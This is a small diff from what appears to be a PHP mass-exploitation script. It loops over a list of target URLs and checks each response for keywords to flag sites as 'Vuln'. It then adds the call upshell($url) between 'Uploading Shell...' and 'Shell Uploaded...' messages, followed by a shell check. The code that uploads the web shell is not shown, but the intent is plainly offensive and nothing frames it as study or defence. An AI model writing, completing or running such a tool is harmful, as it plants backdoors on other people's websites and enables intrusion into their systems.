@@ -10,6 +10,7 @@ foreach($meong as $url){
   if(preg_match("/Windows|window|windows|Window|Default|Template/", $mek)){
     echo "$url -> Vuln \n";
     echo "[+] Uploading Shell...\n";
+    upshell($url);
     echo "[!] Shell Uploaded...\n";
     echo "[!] Checking Shell...\n";
     check($url);
